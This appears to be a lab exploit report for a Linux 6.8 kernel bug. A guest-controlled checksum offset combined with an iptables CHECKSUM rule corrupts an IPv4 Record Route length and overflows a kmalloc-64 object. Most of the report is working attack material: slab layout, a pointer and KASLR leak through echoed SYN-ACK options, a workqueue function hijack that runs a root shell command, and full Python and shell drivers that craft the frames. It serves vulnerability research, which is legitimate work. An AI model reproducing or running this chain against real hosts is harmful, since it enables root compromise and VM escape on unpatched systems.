# REPORT-01 — r6: `xt_CHECKSUM` + 255-byte guest-visible window → workqueue RCE

**Status:** host root demonstrated on `pwnescape-r6` (`192.168.122.216`),
2026-10-19 14:14Z, kernel `6.8.0-139-generic` (pre-fix).

**Model:** host-fixture. This is **not** a strict guest-only chain. The host
provides the `xt_CHECKSUM` writer, the listener, the IPv6 probe, and the CPU7
scheduling fixture. The payload values (`pwq`, `poolhead`, KASLR) are derived
from a frame the guest can capture; the absolute `V/W` slot geometry is still
supplied by an observer.

This is the **recommended route**: it has the fewest observer dependencies of
the two routes and the cleanest dry/fire gates. The original runbook is
[runbooks/r6-observer-free-runbook.md](runbooks/r6-observer-free-runbook.md).

---

## 1. Result

```
/tmp/pwned:
uid=0(root) gid=0(root) groups=0(root)

sha256:
5ef391d886d04116cf84b584ae37ef136f83950ab69b7bfb2a6da7506f7b3a57
```

Key log lines from the original run (evidence is not bundled):

```
QUEUE ffff8b2586508080 ffff8b25801d9e00 ffff8b25801d9e05 ...
ECHO  ffff8b2586508050 48141 7 ...
EXEC  ffff8b2586508080 ffffffff8de6c330 7 ...   # dry: __x86_return_thunk
QUEUE ffff8b2586508340 ffff8b25801d9e00 ffff8b25801d9e05 ...
ECHO  ffff8b2586508310 48142 7 ...
EXEC  ffff8b2586508340 ffffffff8cd2ec10 7 ...   # fire: call_usermodehelper_exec_work
```

---

## 2. Environment

| Item | Value |
|---|---|
| Victim host | L1 `pwnescape-r6`, `192.168.122.216` |
| Attacker | L2 `l2-attacker`, `192.168.250.114` |
| Victim kernel | `6.8.0-139-generic`, pre-fix |
| Attacker kernel | `6.8.0-142-generic` (L2; not the bug target) |
| Host interface | `virbr-pwn`, `192.168.250.1/24`, `fd00:1::1/64` |
| Injector veth | `r6a` ↔ `r6b`, `10.99.0.1/24`, `dum0` guard route |
| Listener | `0.0.0.0:7778` |
| CPU | vhost/sshd/listener on CPU7; CPU7 kworkers `SCHED_IDLE` |

The complete setup commands are in [LAB-ENV.md](LAB-ENV.md). The minimal host
fixture is:

```bash
sudo bash scripts/common/r6veth_up.sh
sudo python3 scripts/common/listen_on.py 7778 &
sudo iptables -t mangle -A INPUT -p tcp --dport 7778 \
  -j CHECKSUM --checksum-fill
sudo ip -6 addr add fd00:1::1/64 dev virbr-pwn nodad
sudo sysctl -qw net.ipv6.conf.virbr-pwn.router_probe_interval=10
sudo sysctl -qw net.ipv4.tcp_synack_retries=12
```

The drivers create the failed-neighbour probe route themselves.

---

## 3. Source map

The exploited split is:

```text
ip_options_compile() saves the parsed option metadata
        |
        |  the LOCAL_IN writer changes the live IPv4 option bytes
        v
tcp_v4_save_options() / __ip_options_echo() re-reads the live length
```

The allocation is `kmalloc(32 + optlen)`; the echo copy starts at `dopt+32`
and uses the live length, so a length larger than `optlen` overflows forward
into the next `kmalloc-64` slot.

All paths are relative to the local `linux-6.8/` tree.

Line numbers refer to the local vanilla `linux-6.8` tree; use the function
names as the stable reference for Ubuntu `6.8.0-139`.

| Path | Function | Role |
|---|---|---|
| `net/core/dev.c:3267` | `skb_checksum_help()` | writes 2 bytes at `csum_start + csum_offset` |
| `net/netfilter/xt_CHECKSUM.c:26` | `checksum_tg()` | calls `skb_checksum_help()` on `CHECKSUM_PARTIAL` |
| `net/netfilter/nft_payload.c:813` | `nft_payload_set_eval()` | nft equivalent writer (r1) |
| `include/net/inet_sock.h:39` | `struct ip_options` | `faddr`, `nexthop`, `optlen`, `__data[]` |
| `include/net/inet_sock.h:58` | `struct ip_options_rcu` | `rcu` + `ip_options`; `dopt` is 32-byte header |
| `include/net/tcp.h:2402` | `tcp_v4_save_options()` | `kmalloc(sizeof(*dopt) + optlen)` |
| `net/ipv4/ip_options.c:77` | `__ip_options_echo()` | re-reads live length; unbounded `memcpy` |
| `net/ipv4/ip_options.c:44` | `ip_options_build()` | copies stored `opt->optlen` into SYN-ACK |
| `net/ipv4/tcp_output.c:4365` | `tcp_rtx_synack()` | retransmits SYN-ACK from stored `ireq_opt` |
| `net/ipv4/tcp_minisocks.c:678` | `tcp_check_req()` | pure retransmitted SYN branch |
| `include/linux/workqueue.h` | `struct work_struct` | `data +0`, `entry +8`, `func +24` |
| `net/ipv6/route.c:596` | `struct __rt6_probe_work` | `work` + `target` + `dev` = 56 B |
| `net/ipv6/route.c:603` | `rt6_probe_deferred()` | the work callback |
| `kernel/workqueue.c:2539` | `process_one_work()` | reads `work->data`, `work->func`; calls it |
| `kernel/umh.c:158` | `call_usermodehelper_exec_work()` | `container_of(work, subprocess_info, work)` |
| `include/linux/umh.h:20` | `struct subprocess_info` | work + path/argv/envp/wait |

### 3.1 The checksum write

`net/core/dev.c`:

```c
int skb_checksum_help(struct sk_buff *skb)
{
    ...
    offset = skb_checksum_start_offset(skb);
    ret = -EINVAL;
    if (unlikely(offset >= skb_headlen(skb))) {
        ...
        goto out;
    }
    csum = skb_checksum(skb, offset, skb->len - offset, 0);

    offset += skb->csum_offset;
    if (unlikely(offset + sizeof(__sum16) > skb_headlen(skb))) {
        ...
        goto out;
    }
    ret = skb_ensure_writable(skb, offset + sizeof(__sum16));
    if (ret)
        goto out;

    *(__sum16 *)(skb->data + offset) = csum_fold(csum) ?: CSUM_MANGLED_0;
    ...
}
```

There is no check that `csum_start` is at or after the network header plus
`ip_hdrlen`. The guest controls the virtio-net `csum_start`, so the write can
land on `IPv4 byte 21` (the RR length byte).

`net/netfilter/xt_CHECKSUM.c`:

```c
static unsigned int
checksum_tg(struct sk_buff *skb, const struct xt_action_param *par)
{
    if (skb->ip_summed == CHECKSUM_PARTIAL && !skb_is_gso(skb))
        skb_checksum_help(skb);

    return XT_CONTINUE;
}
```

### 3.2 The options allocation and echo

`include/net/tcp.h`:

```c
static inline struct ip_options_rcu *tcp_v4_save_options(struct net *net,
                                                         struct sk_buff *skb)
{
    const struct ip_options *opt = &TCP_SKB_CB(skb)->header.h4.opt;
    struct ip_options_rcu *dopt = NULL;

    if (opt->optlen) {
        int opt_size = sizeof(*dopt) + opt->optlen;

        dopt = kmalloc(opt_size, GFP_ATOMIC);
        if (dopt && __ip_options_echo(net, &dopt->opt, skb, opt)) {
            kfree(dopt);
            dopt = NULL;
        }
    }
    return dopt;
}
```

`net/ipv4/ip_options.c`:

```c
int __ip_options_echo(struct net *net, struct ip_options *dopt,
                      struct sk_buff *skb, const struct ip_options *sopt)
{
    ...
    sptr = skb_network_header(skb);
    dptr = dopt->__data;

    if (sopt->rr) {
        optlen  = sptr[sopt->rr+1];
        soffset = sptr[sopt->rr+2];
        dopt->rr = dopt->optlen + sizeof(struct iphdr);
        memcpy(dptr, sptr+sopt->rr, optlen);
        ...
    }
    ...
}
```

The length is re-read from the **live packet** (`sptr[sopt->rr+1]`), not from
the stored `sopt->optlen`. The writer changes that byte after
`ip_options_compile()`.

### 3.3 The SYN-ACK copy

`net/ipv4/ip_options.c`:

```c
void ip_options_build(struct sk_buff *skb, struct ip_options *opt,
                      __be32 daddr, struct rtable *rt)
{
    unsigned char *iph = skb_network_header(skb);

    memcpy(&(IPCB(skb)->opt), opt, sizeof(struct ip_options));
    memcpy(iph + sizeof(struct iphdr), opt->__data, opt->optlen);
    ...
}
```

`tcp_rtx_synack()` calls `tcp_v4_send_synack()` with the stored
`ireq->ireq_opt`; `ip_options_build()` copies `opt->optlen` bytes with no
40-byte clamp.

### 3.4 Workqueue execution

`kernel/workqueue.c`:

```c
static void process_one_work(struct worker *worker, struct work_struct *work)
{
    struct pool_workqueue *pwq = get_work_pwq(work);
    ...
    worker->current_func = work->func;
    ...
    strscpy(worker->desc, pwq->wq->name, WORKER_DESC_LEN);
    list_del_init(&work->entry);
    ...
    worker->current_func(work);
}
```

`kernel/umh.c`:

```c
static void call_usermodehelper_exec_work(struct work_struct *work)
{
    struct subprocess_info *sub_info =
        container_of(work, struct subprocess_info, work);

    if (sub_info->wait & UMH_WAIT_PROC) {
        call_usermodehelper_exec_sync(sub_info);
    } else {
        ...
    }
}
```

`include/linux/umh.h`:

```c
struct subprocess_info {
    struct work_struct work;
    struct completion *complete;
    const char *path;
    char **argv;
    char **envp;
    int wait;
    int retval;
    int (*init)(struct subprocess_info *info, struct cred *new);
    void (*cleanup)(struct subprocess_info *info);
    void *data;
} __randomize_layout;
```

On the audited target `CONFIG_RANDSTRUCT_NONE=y`; the declaration order above
is the actual layout. If `RANDSTRUCT` were enabled, the payload offsets would
change.

---

## 4. Primitive and geometry

### 4.1 The slab layout

All three objects are `kmalloc-64` from the same randomized cache:

```
[S_b : overflower dopt][S_v : victim dopt][S_w : rt6_probe_work]
          +64                  +64
```

- `dopt` base is `struct ip_options_rcu`; `ip_options.__data` is at `dopt+32`.
- `ip_options.optlen` is at `dopt+24` (`16` rcu + `8` into `ip_options`).
- `rt6_probe_work` is `work_struct` (32 B) + `in6_addr` (16 B) + `dev` (8 B)
  = 56 B -> `kmalloc-64`.

`include/net/inet_sock.h`:

```c
struct ip_options {
    __be32        faddr;        /* +0  */
    __be32        nexthop;      /* +4  */
    unsigned char optlen;       /* +8  */
    unsigned char srr;          /* +9  */
    unsigned char rr;           /* +10 */
    unsigned char ts;           /* +11 */
    unsigned char is_strictroute:1,
                  srr_is_hit:1,
                  is_changed:1,
                  rr_needaddr:1,
                  ts_needtime:1,
                  ts_needaddr:1;
    unsigned char router_alert;
    unsigned char cipso;
    unsigned char __pad2;
    unsigned char __data[];
};

struct ip_options_rcu {
    struct rcu_head rcu;        /* +0, 16 bytes */
    struct ip_options opt;      /* +16 */
};
```

Therefore `dopt->opt.optlen` is `dopt+24` and `dopt->opt.__data` is
`dopt+32`.

`net/ipv6/route.c`:

```c
struct __rt6_probe_work {
    struct work_struct work;
    struct in6_addr target;
    struct net_device *dev;
    netdevice_tracker dev_tracker;
};
```

The tracker is empty on the audited config; the allocation is 56 B.

### 4.2 Read: 255-byte window

1. Prime ~40 victim SYNs with valid RR options (`IHL=32`, 12-byte options).
2. Pick `[S_b][S_v][S_w]` on the same active page.
3. `RST S_w`; trigger the IPv6 probe so `rt6_probe_deferred` work lands at
   `S_w`.
4. `RST S_b`; send the overflower SYN with `wire=0x4000`.
   - The writer sets live RR length to `0x40` (64).
   - The echo copies 64 B from `IP+20` to `S_b+32`:
     `S_b+32 .. S_b+95 = S_v-32 .. S_v+31`.
   - TCP payload byte 24 lands at `S_v+24` and sets the victim's stored
     `optlen = 0xff` (255).
   - The copy stops at `S_v+31`; it does **not** touch the work at `S_w`.
5. Send a pure duplicate SYN of the victim (`seq == rcv_isn`, SYN only).
   `tcp_check_req()` takes the pure-retransmit branch, and
   `tcp_rtx_synack()` uses the stored `ireq_opt` with `optlen=255`.
   `ip_options_build()` copies 255 B from `S_v+32` into the SYN-ACK options.

Guest-visible window:

```
IP options = ip[20:275]
window[0:32]  = S_v+32 .. S_v+63   (victim dopt tail)
window[32:40] = work->data          (S_w+0)
window[40:48] = work->entry.next    (S_w+8)
window[48:56] = work->entry.prev    (S_w+16)
window[56:64] = work->func          (S_w+24)
```

Derivation:

```text
pwq      = data & ~0xff
poolhead = entry.next
kbase    = func - 0x10cbfd0     # rt6_probe_deferred, 6.8.0-139
pool     = poolhead - 40        # offsetof(worker_pool, worklist), optional
```

### 4.3 Write: workqueue hijack

1. `RST V` frees the victim dopt at `S_v`.
2. Send the fire overflower with `wire=0xE000`.
   - The writer sets live RR length to `0xE0` (224).
   - The dopt reuses `S_v` (SLUB per-CPU LIFO).
   - The echo copies 224 B from `IP+20` to `S_v+32 = W-32`, covering
     `W-32 .. W+191`.
3. Payload at `W`. `include/linux/workqueue.h` defines `struct work_struct` as:

```c
struct work_struct {
    atomic_long_t data;       /* +0  */
    struct list_head entry;   /* +8  */
    work_func_t func;         /* +24 */
};
```

```text
W+0    work->data      = pwq | 5
W+8    work->entry.next = poolhead
W+16   work->entry.prev = poolhead
W+24   work->func       = kbase + 0x12ec10  (call_usermodehelper_exec_work)
W+32   sub_info->complete = 0
W+40   sub_info->path     = W + 128
W+48   sub_info->argv     = W + 160
W+56   sub_info->envp     = W + 184
W+64   sub_info->wait     = 2
W+128  "/bin/sh"
W+136  "-c"
W+140  "id > /tmp/pwned"
W+160  argv array
W+184  envp array
```

4. The kworker on CPU7 runs `process_one_work()`:
   - `pwq` is genuine, so `get_work_pwq`, `pwq->wq->name`, `pwq->stats`, and
     `list_del_init` all succeed;
   - `worker->current_func = work->func` is the overwritten
     `call_usermodehelper_exec_work`;
   - the callback interprets `W` as `subprocess_info` and runs
     `/bin/sh -c 'id > /tmp/pwned'` as root.

### 4.4 Critical section

The probe and the copy must be in **one FIFO section**:

```
RST W -> probe6(gw) -> RST V -> overflower
```

The probe queues the work at `W`; CPU7 kworkers are `SCHED_IDLE`; the sender is
`SCHED_FIFO 50` on CPU7. This prevents the kworker from dequeuing the work
between the probe and the overwrite. A split section was observed to fail:
`EXEC` ran 39.5 us after `QUEUE`, 347 us before the echo.

---

## 5. Scripts

The scripts below are the exact drivers stored under `scripts/`. The r6
drivers run on L1 and inject frames through `r6a`; `r6guestsniff.py` runs on
L2 and captures the same SYN-ACK.

### 5.1 `scripts/common/r6veth_up.sh`

```bash
#!/bin/bash
# r6veth_up.sh: safe veth fixture for host-side R6 injection (L1, root).
# Victim source 172.31.99.2 has a unicast /32 route via a dummy device, so
# source validation passes but SYN-ACKs are dropped by the dummy device
# (no forwarding loop).
set -u
ip link del r6a 2>/dev/null
ip link add r6a type veth peer name r6b
ip addr add 10.99.0.1/24 dev r6b
ip link set r6a up
ip link set r6b up
ip link del dum0 2>/dev/null
ip link add dum0 type dummy
ip link set dum0 up
ip route replace 172.31.99.2/32 dev dum0
ip route del blackhole 172.31.99.0/24 2>/dev/null
sysctl -qw net.ipv4.conf.r6b.rp_filter=0 net.ipv4.conf.r6a.rp_filter=0
sysctl -qw net.ipv4.conf.r6b.forwarding=0 net.ipv4.conf.r6a.forwarding=0
iptables -C FORWARD -i r6a -o r6b -j DROP 2>/dev/null || iptables -I FORWARD 1 -i r6a -o r6b -j DROP
iptables -C FORWARD -i r6b -o r6a -j DROP 2>/dev/null || iptables -I FORWARD 1 -i r6b -o r6a -j DROP
echo "r6veth up: peer=$(cat /sys/class/net/r6b/address) route=$(ip route show 172.31.99.2/32)"
```

### 5.2 `scripts/common/listen_on.py`

```python
#!/usr/bin/env python3
# listen_on.py -- minimal TCP listener for the PwnEscape lab.
#
# Binds 0.0.0.0:7778, accepts connections, and parks each accepted socket in a
# thread.  The chain only needs the host to have a live listening socket and a
# populated SYN/accept path; the workqueue target itself is rt6_probe_deferred.
#
# Usage: sudo python3 listen_on.py [port]
import os
import socket
import sys
import threading
import time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 7778
HOST = "0.0.0.0"


def park(c, a):
    try:
        c.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        while True:
            time.sleep(3600)
    except Exception:
        pass
    finally:
        try:
            c.close()
        except Exception:
            pass


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(4096)
    print("listen_on %s:%d pid=%d" % (HOST, PORT, os.getpid()), flush=True)
    while True:
        try:
            c, a = s.accept()
        except KeyboardInterrupt:
            return
        except Exception:
            continue
        threading.Thread(target=park, args=(c, a), daemon=True).start()



if __name__ == "__main__":
    main()
```

### 5.3 `scripts/common/r6obs_build.sh`

```bash
#!/bin/bash
# r6obs_build.sh -- build the CO-RE observer on the L1 (root not needed).
set -e
cd /opt/pwnescape/tools
bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -I. -c r6obs.bpf.c -o r6obs.bpf.o
gcc -O2 -o r6obs r6obs.c -lbpf -lelf -lz
echo "built: $(ls -la r6obs r6obs.bpf.o | awk '{print $5, $9}' | tr '\n' ' ')"
```

### 5.4 `scripts/common/r6_host_gate2.py`

The gate imports `scripts/common/r6e.py` and calls `scripts/common/cacheid.py`.
Both are installed into `/opt/pwnescape/tools` by `install.sh`.

```python
#!/usr/bin/env python3
# r6_host_gate2.py -- dual-callsite host gate.
#
# Linux 6.8 net/ipv6/route.c compiles find_match() twice:
#   * embedded nexthop route (f6i->nh == NULL): find_match() called directly
#   * nexthop object route  (f6i->nh != NULL): via rt6_nh_find_match()
# Each copy has its own kmalloc callsite, hence its own kmalloc-rnd-NN-64
# cache index (site E / site N).  That gives two independent per-boot chances
# to match the dopt cache.
#
# Read-only: r6obs + cacheid.py, no bpftrace, no ftrace, no kernel write.
import os, sys, time, socket, subprocess

sys.path.insert(0, "/opt/pwnescape/tools")
import r6e

T = "/opt/pwnescape/tools"
RT6 = r6e.ksym("rt6_probe_deferred")
N = int(sys.argv[1]) if len(sys.argv) > 1 else 8
G0 = int(sys.argv[2], 0) if len(sys.argv) > 2 else (0x7000 + os.getpid() % 0x100)
GW_E = G0
GW_N = G0 + 1
NHID = 20000 + (G0 & 0xffff)


def cid(addr):
    r = subprocess.run(["python3", T + "/cacheid.py", hex(addr)],
                       capture_output=True, text=True)
    p = r.stdout.split()
    return (p[0], p[1]) if len(p) >= 2 else ("?", "?")


def sh(c):
    return subprocess.run(c, shell=True, capture_output=True, text=True)


try:
    os.sched_setaffinity(0, {7})
except Exception:
    pass

# fixtures: same failed gateway, two route types, both aged 11.6 s
sh("ip -6 route del fd01:0:%x::/64 2>/dev/null" % GW_E)
sh("ip -6 route del fd01:0:%x::/64 2>/dev/null" % GW_N)
sh("ip nexthop del id %d 2>/dev/null" % NHID)
sh("ip -6 route replace fd01:0:%x::/64 via fe80::%x dev virbr-pwn" % (GW_E, GW_E))
nhr = sh("ip nexthop add id %d via fe80::%x dev virbr-pwn" % (NHID, GW_N))
if nhr.returncode != 0:
    print("nexthop add failed: %s" % nhr.stderr.strip(), flush=True)
sh("ip -6 route replace fd01:0:%x::/64 nhid %d" % (GW_N, NHID))
for g in (GW_E, GW_N):
    sh("ip -6 neigh replace fe80::%x lladdr 02:00:00:00:00:01 dev virbr-pwn nud failed" % g)
print("gate2 E=0x%x N=0x%x nhid=%d rt6=%#x" % (GW_E, GW_N, NHID, RT6), flush=True)
time.sleep(11.6)

os.system("pkill -x bpftrace 2>/dev/null; pkill -x r6obs 2>/dev/null")
time.sleep(0.2)
log = "/tmp/r6_host_gate2.log"
open(log, "w").close()
obs = subprocess.Popen([T + "/r6obs", "%x" % RT6, "20"],
                       stdout=open(log, "w"), stderr=subprocess.STDOUT)
for _ in range(60):
    if "READY" in open(log, errors="ignore").read():
        break
    time.sleep(0.1)

# dopt victims
s = r6e.sock()
base = 57000 + (int(time.time()) % 200)
for i in range(N):
    s.send(r6e.frame(base + i, 0x71000000 + i))
time.sleep(0.15)

kws = sh("ps -eLo tid,psr,comm | awk '$2==7 && /kworker/ {print $1}'").stdout.split()
for t in kws:
    sh("chrt -i -p 0 %s 2>/dev/null" % t)
s6 = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 58)
s6.bind(("fd00:1::1", 0))
try:
    r6e.probe6(GW_E, s6)       # embedded-nexthop callsite
except OSError as e:
    print("probe E failed: %s" % e, flush=True)
time.sleep(0.12)
try:
    r6e.probe6(GW_N, s6)       # nexthop-object callsite
except OSError as e:
    print("probe N failed: %s" % e, flush=True)
time.sleep(0.30)
for t in kws:
    sh("chrt -o -p 0 %s 2>/dev/null" % t)
time.sleep(0.3)
obs.terminate()
try:
    obs.wait(timeout=3)
except Exception:
    obs.kill()

Q = []; E = []
for ln in open(log, errors="ignore"):
    p = ln.split()
    if not p:
        continue
    if p[0] == "QUEUE" and len(p) >= 8:
        Q.append((int(p[1], 16), int(p[2], 16), int(p[3], 16), int(p[4], 16),
                  int(p[6], 16), int(p[7])))
    elif p[0] == "ECHO" and len(p) >= 4:
        E.append((int(p[1], 16), int(p[2])))

D_IDX = D_ADDR = "?"
for (ad, sp) in E:
    obj = ad - 16
    nm, idx = cid(obj)
    if idx != "?":
        D_IDX, D_ADDR = idx, obj
        break

sites = []
for (work, pwq, data, ph, func, cpu) in Q:
    nm, idx = cid(work)
    sites.append((idx, work, pwq, data, ph, func, cpu))

sE = sites[0] if len(sites) >= 1 else None
sN = sites[1] if len(sites) >= 2 else None
hit = None
if sE and D_IDX != "?" and sE[0] == D_IDX:
    hit = "E"
elif sN and D_IDX != "?" and sN[0] == D_IDX:
    hit = "N"
verdict = "ELIGIBLE" if hit else "INELIGIBLE"

def fmt(s):
    if not s:
        return "none"
    return "%s(%s,pwq=%s,data=%s,ph=%s,func=%s,cpu=%d)" % (
        s[0], hex(s[1]), hex(s[2]), hex(s[3]), hex(s[4]), hex(s[5]), s[6])

print("HOSTGATE2 dopt=%s(%s) siteE=%s siteN=%s hit=%s verdict=%s" % (
    D_IDX, hex(D_ADDR) if D_ADDR != "?" else "?", fmt(sE), fmt(sN),
    hit or "-", verdict), flush=True)
print("bpftrace_running=%s" % bool(sh("pgrep -x bpftrace").stdout.strip()), flush=True)
```

### 5.5 `scripts/r6/r6read.py` — 255-byte leak + derivation

```python
#!/usr/bin/env python3
# r6read.py -- R7 observer-free 255B window, read-only geometry test on r6.
#
# Chain (all slots kmalloc-64, same cache, same CPU7 active slab):
#   [ S_b : overflower dopt ][ S_v : live victim dopt ][ S_w : queued rt6 work ]
#   S_v = S_b + 64, S_w = S_v + 64
#
# Steps:
#   1. allocate N victim requests (dopts) on one page; ECHO map gives slots.
#   2. pick triple S_b,S_v,S_w (all ours, same page).
#   3. RST S_w; IPv6 probe -> rt6_probe work lands at S_w.
#   4. RST S_b; overflower SYN (wire=0x4000) dopt lands at S_b and its
#      64-byte echo covers S_v-32..S_v+31.  Payload[24]=0xff sets the *stored*
#      S_v optlen to 255 (S_v+24 is destination offset 56 = source payload[24]).
#      The write stops at S_v+31 -> work header at S_w is untouched.
#   5. duplicate SYN of the S_v request (seq == original ISN) -> tcp_check_req
#      "pure retransmitted SYN" -> inet_rtx_syn_ack() -> tcp_rtx_synack() ->
#      tcp_v4_send_synack() uses the stored ireq_opt (optlen=255) ->
#      ip_options_build copies 255 B from S_v+32 into the SYN-ACK.
#      work header (S_w) = window offset 32.
#   6. capture the SYN-ACK (host virbr-pwn; guest can sniff the same frame)
#      and compare with r6obs QUEUE ground truth.
#
# Read-only in the sense of no func hijack: only 0x4000 is used, no 0xE000,
# no 0xFF00, no fire.  Observer is used for setup/verification only.
import os, re, sys, time, struct, socket, subprocess

DEV = "r6a"; PEER = "r6b"
SRC4 = bytes([192, 168, 250, 114])   # guest IP: SYN-ACK egresses virbr-pwn
DST4 = bytes([192, 168, 250, 1])     # listener on virbr-pwn: SYN-ACK src is on-egress
LOG = "/tmp/r6new/obs.log"
RT6_OFF = 0x10cbfd0


def sh(c, to=30):
    return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=to)


def ksym(n):
    out = sh("grep -w %s /proc/kallsyms | head -1" % n).stdout.split()
    return int(out[0], 16) if out else 0


def csum(d):
    if len(d) % 2:
        d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d) // 2), d))
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def csum_partial(d):
    s = 0; i = 0
    while i + 1 < len(d):
        s += d[i] | (d[i + 1] << 8); i += 2
    if i < len(d):
        s += d[i]
    return s


def csum_fold(s):
    s = (s & 0xffff) + (s >> 16); s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff


def htons(v):
    return ((v << 8) | (v >> 8)) & 0xffff


def peer_mac():
    try:
        return bytes.fromhex(open("/sys/class/net/%s/address" % PEER).read().strip().replace(":", ""))
    except Exception:
        return b"\xff" * 6


def frame(sport, seq, wire=None, payload=b"\x41" * 64, rst=False):
    hl = 20 if rst else 32
    thlen = 20
    ip = bytearray(hl + thlen + len(payload))
    ip[0] = 0x40 | (hl // 4)
    struct.pack_into(">H", ip, 2, len(ip))
    struct.pack_into(">H", ip, 4, 0x4242)
    ip[8] = 64; ip[9] = 6
    ip[12:16] = SRC4; ip[16:20] = DST4
    if not rst:
        ip[20] = 7; ip[21] = 11; ip[22] = 12
        for i in range(23, 31):
            ip[i] = 0x40 + i
        ip[31] = 0
    th = memoryview(ip)[hl:]
    struct.pack_into(">HHII", th, 0, sport, 7778, seq & 0xffffffff, 0)
    th[12] = 5 << 4
    th[13] = 0x04 if rst else 0x02
    struct.pack_into(">H", th, 14, 0x4000)
    if not rst:
        th[thlen:] = payload
    pseudo = SRC4 + DST4 + b"\0" + bytes([6]) + struct.pack(">H", thlen + len(payload))
    seg = pseudo + bytes(th[:thlen + len(payload)])
    struct.pack_into(">H", th, 16, csum(seg))
    vhdr = bytearray(10)
    if wire is not None:
        want = htons(wire)
        for w in range(65536):
            ip[25] = w & 0xff; ip[26] = (w >> 8) & 0xff
            if csum_fold(csum_partial(bytes(ip[21:]))) == want:
                break
        struct.pack_into(">H", ip, 10, 0)
        struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
        vhdr[0] = 1
        struct.pack_into("<H", vhdr, 6, 14 + 21)   # plain Ethernet: IP+21
    else:
        struct.pack_into(">H", ip, 10, 0)
        struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
    eth = peer_mac() + bytes.fromhex("020000000002") + struct.pack(">H", 0x0800)
    return bytes(vhdr) + eth + bytes(ip)


def sock():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((DEV, 0))
    s.setsockopt(263, 15, 1)      # PACKET_VNET_HDR
    return s


def probe6(gw, s6):
    icmp = struct.pack(">BBHHH", 128, 0, 0, 0x1234, 0) + b"R6R6"
    s6.sendto(icmp, ("fd01:0:%x::1" % gw, 0, 0, 0))


def read_payload():
    # 64-byte wire copy: only payload[0..31] lands in the copy window.
    # dest S_v+16..S_v+31 == source payload[16..31]
    p = bytearray(64)
    p[16:24] = b"\0" * 8          # faddr, nexthop = 0
    p[24] = 0xff                  # optlen = 255  (S_v+24)
    p[25:32] = b"\0" * 7          # srr, rr, ts, flags, router_alert, cipso, pad
    return bytes(p)


def start_obs(rt6, secs=45):
    os.makedirs("/tmp/r6new", exist_ok=True)
    open(LOG, "w").close()
    obs = subprocess.Popen(["/opt/pwnescape/tools/r6obs", "%x" % rt6, str(secs)],
                           stdout=open(LOG, "w"), stderr=subprocess.STDOUT)
    for _ in range(80):
        if "READY" in open(LOG, errors="ignore").read():
            return obs, True
        time.sleep(0.1)
    return obs, False


def parse_obs():
    q = []; e = []; x = []
    for ln in open(LOG, errors="ignore"):
        p = ln.split()
        if not p:
            continue
        try:
            if p[0] == "QUEUE" and len(p) >= 9:
                q.append(dict(work=int(p[1], 16), pwq=int(p[2], 16), data=int(p[3], 16),
                              next=int(p[4], 16), prev=int(p[5], 16), func=int(p[6], 16),
                              cpu=int(p[7])))
            elif p[0] == "EXEC" and len(p) >= 5:
                x.append(dict(work=int(p[1], 16), func=int(p[2], 16), cpu=int(p[3])))
            elif p[0] == "ECHO" and len(p) >= 5:
                e.append(dict(dopt=int(p[1], 16), sport=int(p[2]), cpu=int(p[3]),
                              ts=int(p[4])))
        except Exception:
            pass
    return q, e, x


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 40
    gw = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x7b00
    rt6 = ksym("rt6_probe_deferred")
    stext = ksym("_stext")
    try:
        os.sched_setaffinity(0, {7})
    except Exception as e:
        print("affinity err", e, flush=True)
    print("read n=%d gw=%#x rt6=%#x stext=%#x cpu=%d" %
          (n, gw, rt6, stext, os.sched_getaffinity(0).pop()), flush=True)

    # fixtures: nexthop-object route => site N (the cache that matched the dopt)
    nhid = 30000 + (gw & 0xffff)
    sh("ip -6 route del fd01:0:%x::/64 2>/dev/null" % gw)
    sh("ip nexthop del id %d 2>/dev/null" % nhid)
    r = sh("ip nexthop add id %d via fe80::%x dev virbr-pwn" % (nhid, gw))
    if r.returncode != 0:
        print("nexthop add failed: %s" % r.stderr.strip(), flush=True)
    sh("ip -6 route replace fd01:0:%x::/64 nhid %d" % (gw, nhid))
    sh("ip -6 neigh replace fe80::%x lladdr 02:00:00:00:00:01 dev virbr-pwn nud failed" % gw)
    # make the guest-side SYN-ACK destination immediately resolvable/observable
    sh("ip neigh replace 192.168.250.114 lladdr 52:54:00:b2:39:e6 dev virbr-pwn nud permanent 2>/dev/null")
    print("aging 11.6s", flush=True)
    time.sleep(11.6)

    sh("pkill -x bpftrace 2>/dev/null; pkill -x r6obs 2>/dev/null")
    time.sleep(0.2)
    obs, ready = start_obs(rt6)
    print("obs_ready=%s" % ready, flush=True)
    if not ready:
        obs.terminate(); return 1

    s6 = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 58)
    s6.bind(("fd00:1::1", 0))
    s = sock()

    # capture socket on the egress interface (and therefore guest-visible)
    cap = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    cap.bind(("virbr-pwn", 0))
    cap.setblocking(False)

    # 1) victims
    base = 51000 + (int(time.time()) % 500)
    seqbase = 0x51000000 + (int(time.time()) & 0xffff) * 256
    sports = set(range(base, base + n))
    for i in range(n):
        s.send(frame(base + i, (seqbase + i) & 0xffffffff))
    time.sleep(0.15)

    q0, e0, x0 = parse_obs()
    emap = {ev["sport"]: ev["dopt"] for ev in e0 if ev["sport"] in sports}
    slots = {sp: (ad - 16) for sp, ad in emap.items()}   # allocation base
    print("victims=%d echo=%d" % (n, len(slots)), flush=True)
    if len(slots) < 8:
        print("ABORT too few dopts"); obs.terminate(); return 1
    pages = {}
    for sp, a in slots.items():
        pages.setdefault(a & ~0xfff, []).append((sp, a))
    last = max(e0, key=lambda ev: ev.get("ts", 0)) if e0 else None
